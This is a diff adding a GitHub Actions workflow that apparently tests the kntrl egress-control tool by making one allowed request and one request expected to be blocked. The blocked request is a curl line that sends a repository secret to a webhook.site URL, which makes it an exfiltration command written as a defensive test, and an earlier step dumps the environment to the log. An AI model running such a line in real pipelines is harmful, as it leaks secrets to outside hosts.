@@ -1,0 +1,35 @@
+name: CI with kntrl Security
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: harphies-cicd
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Environment Setup
+        run: | 
+          echo "Setting up environment..."
+          env
+
+      - name: Test allowed request
+        run: |
+          echo "Testing allowed request to download.kondukto.io..."
+          curl -v https://download.kondukto.io 2>&1 | grep "HTTP/"
+
+      - name: Test disallowed request with secret
+        env:
+          SECRET: ${{ secrets.MY_SECRET }}
+        run: |
+          echo "Testing disallowed request with secret..."
+          curl --connect-timeout 5 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET&id=$GITHUB_RUN_ID || echo "Request blocked as expected"
+
+      - name: Print kntrl report
+        run: |
+          echo "Printing kntrl report..."
+          echo "---------------------"
+          cat /tmp/kntrl_report.out || echo "Report file not found"
+          echo "---------------------"
